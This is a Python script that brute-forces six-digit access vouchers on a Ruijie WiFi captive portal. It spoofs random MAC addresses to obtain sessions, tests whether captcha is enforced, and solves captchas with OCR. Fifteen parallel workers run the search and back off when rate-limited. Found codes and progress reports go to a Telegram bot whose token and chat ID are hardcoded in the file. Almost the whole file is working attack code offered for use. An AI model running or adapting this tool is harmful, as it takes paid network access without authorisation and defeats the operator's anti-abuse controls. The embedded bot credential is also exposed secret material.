#!/usr/bin/env python3
"""
Ruijie WiFi Code Scanner - Optimised
 - Numeric-only codes: 000000-999999 = only 1 million combos (vs 56B alphanumeric)
 - Captcha bypass attempt first (many Ruijie setups have captcha disabled)
 - Session reuse: one captcha solve → 100 code checks
 - 15 parallel workers
"""
import asyncio, aiohttp, re, time, random, sys, os, io, json

BOT_TOKEN   = os.environ.get("BOT_TOKEN",  "8915737207:AAFymbnH_1Ga39WrcoRmfhca73hGhwF4kzY")
CHAT_ID     = os.environ.get("CHAT_ID",    "5406128711")
SESSION_URL = os.environ.get("SESSION_URL", "")

CODE_LEN    = 6
WORKERS     = 15
BATCH       = 100       # codes per captcha solve
PORTAL      = "https://portal-as.ruijienetworks.com"
VOUCHER_URL = PORTAL + "/api/auth/voucher/?lang=en_US"

found_codes   = []
checked       = 0
captcha_needed = None   # None=unknown, True/False after first test
start_time    = time.time()

# ── helpers ───────────────────────────────────────────────────────────────────
def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def replace_mac(url, mac):
    return re.sub(r'mac=[^&]+', f'mac={mac}', url)

async def tg(text):
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
                timeout=aiohttp.ClientTimeout(total=10)
            )
    except: pass

HDRS_NAV = {
    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,*/*",
}
HDRS_API = {
    "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
    "origin": PORTAL,
}

async def get_session_id(session):
    mac = random_mac()
    url = replace_mac(SESSION_URL, mac)
    try:
        async with session.get(url, headers=HDRS_NAV, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else None
    except:
        return None

async def get_captcha_image(session, sid):
    try:
        async with session.get(f"{PORTAL}/api/auth/captcha/image",
                               params={"sessionId": sid, "_t": str(time.time())},
                               headers={**HDRS_API, "accept": "image/*"},
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            return await r.read()
    except:
        return None

def solve_captcha(image_bytes):
    try:
        from PIL import Image, ImageFilter, ImageEnhance, ImageOps
        import pytesseract
        img = Image.open(io.BytesIO(image_bytes)).convert("L")
        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
        img = ImageEnhance.Contrast(img).enhance(3.5)
        img = img.filter(ImageFilter.MedianFilter(3))
        img = img.point(lambda x: 0 if x < 130 else 255, '1')
        t = pytesseract.image_to_string(
            img, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz'
        )
        return ''.join(t.strip().split())[:6] or None
    except:
        return None

async def verify_captcha(session, sid, text):
    try:
        async with session.post(f"{PORTAL}/api/auth/captcha/verify",
                                json={"sessionId": sid, "authCode": text},
                                headers=HDRS_API,
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
            d = await r.json()
            return d.get("success") is True
    except:
        return False

async def voucher_post(session, sid, code, auth_code):
    """POST one voucher. Returns 'found'|'captcha_err'|'rate_limit'|'invalid'|'err'"""
    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
    try:
        async with session.post(VOUCHER_URL, json=data, headers=HDRS_API,
                                timeout=aiohttp.ClientTimeout(total=15)) as r:
            body = await r.text()
            if "logonUrl" in body:       return "found"
            if "request limited" in body: return "rate_limit"
            if "captcha" in body.lower(): return "captcha_err"
            return "invalid"
    except:
        return "err"

# ── captcha bypass test (run once) ───────────────────────────────────────────
async def test_captcha_needed(session):
    """Check if this portal requires captcha. Returns True/False."""
    sid = await get_session_id(session)
    if not sid:
        return True   # assume yes
    # Try posting with empty auth_code
    result = await voucher_post(session, sid, "000000", "")
    # If not captcha_err → captcha not enforced
    print(f"[captcha_test] result={result}")
    return result == "captcha_err"

# ── get a ready session (sid + auth_code) ────────────────────────────────────
async def get_ready_session(session):
    global captcha_needed
    for _ in range(15):
        sid = await get_session_id(session)
        if not sid:
            await asyncio.sleep(1)
            continue
        if not captcha_needed:          # bypass mode — no captcha needed
            return sid, ""
        # Need captcha
        for _ in range(10):
            img = await get_captcha_image(session, sid)
            if not img:
                continue
            text = solve_captcha(img)
            if not text:
                await asyncio.sleep(0.2)
                continue
            if await verify_captcha(session, sid, text):
                return sid, text
            await asyncio.sleep(0.2)
        await asyncio.sleep(0.5)
    return None, None

# ── numeric code generator (000000-999999, random order) ─────────────────────
def num_code_generator():
    """All 6-digit numeric codes in random order — only 1 million total."""
    codes = list(range(1_000_000))
    random.shuffle(codes)
    for n in codes:
        yield f"{n:06d}"

# ── worker ───────────────────────────────────────────────────────────────────
async def worker(queue, wid):
    global checked, found_codes, captcha_needed
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:

        # First worker tests captcha requirement once
        if wid == 1 and captcha_needed is None:
            captcha_needed = await test_captcha_needed(session)
            mode = "WITH captcha" if captcha_needed else "NO captcha (bypass!)"
            print(f"[captcha_test] mode = {mode}")
            await tg(f"🔍 Captcha mode: <b>{mode}</b>")

        while True:
            sid, auth = await get_ready_session(session)
            if not sid:
                print(f"[W{wid}] no session — retrying")
                await asyncio.sleep(3)
                continue

            for _ in range(BATCH):
                code = await queue.get()
                if code is None:
                    queue.task_done()
                    return

                result = await voucher_post(session, sid, code, auth)
                checked += 1

                if result == "found":
                    found_codes.append(code)
                    msg = f"✅ <b>FOUND CODE: {code}</b>\n⏱ {time.strftime('%H:%M:%S')}"
                    print(f"\n{'='*40}\n✅ FOUND: {code}\n{'='*40}")
                    await tg(msg)

                elif result == "captcha_err":
                    queue.task_done()
                    await asyncio.sleep(0.5)
                    break   # refresh session+captcha

                elif result == "rate_limit":
                    queue.task_done()
                    await asyncio.sleep(3)
                    break

                queue.task_done()

# ── progress ─────────────────────────────────────────────────────────────────
async def progress_printer():
    prev, prev_t = 0, time.time()
    while True:
        await asyncio.sleep(60)
        now  = time.time()
        rate = (checked - prev) / max(now - prev_t, 1)
        eta  = int((1_000_000 - checked) / max(rate, 0.01))
        eta_s = f"{eta//3600}h{(eta%3600)//60}m" if eta > 3600 else f"{eta//60}m{eta%60}s"
        msg  = (f"📊 checked=<b>{checked:,}</b>/1,000,000 | "
                f"speed=<b>{rate:.1f}/s</b> | found=<b>{len(found_codes)}</b> | ETA={eta_s}")
        print(f"[scan] {msg}")
        await tg(msg)
        prev, prev_t = checked, now

# ── main ─────────────────────────────────────────────────────────────────────
async def main():
    global captcha_needed
    captcha_needed = None

    session_url_env = SESSION_URL
    if not session_url_env:
        session_url_env = input("Ruijie URL ထည့်ပါ: ").strip()
    if not session_url_env:
        sys.exit("URL မပေး")

    # patch SESSION_URL into global
    global SESSION_URL
    SESSION_URL = session_url_env

    print(f"[scan] Workers={WORKERS} | Batch={BATCH} | Codes=000000-999999 (1M)")
    await tg(f"🚀 <b>Scan started</b>\nCodes: 000000–999999 (1,000,000 total)\nWorkers: {WORKERS} | Batch: {BATCH}/session\nFound codes → sent here instantly")

    queue = asyncio.Queue(maxsize=WORKERS * 20)
    tasks = [asyncio.create_task(worker(queue, i+1)) for i in range(WORKERS)]
    prog  = asyncio.create_task(progress_printer())
    stop  = asyncio.Event()

    async def feeder():
        for code in num_code_generator():
            if stop.is_set(): break
            await queue.put(code)
        for _ in range(WORKERS):
            await queue.put(None)

    feed = asyncio.create_task(feeder())

    try:
        await asyncio.gather(*tasks)
    except (KeyboardInterrupt, asyncio.CancelledError):
        stop.set(); feed.cancel()

    prog.cancel()
    total = int(time.time() - start_time)
    summary = (f"🏁 <b>Scan complete</b>\n"
               f"Checked: {checked:,}/1,000,000\n"
               f"Found: {len(found_codes)}\n"
               f"Codes: {', '.join(found_codes) if found_codes else 'none'}\n"
               f"Time: {total//60}m {total%60}s")
    print(summary)
    await tg(summary)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped")
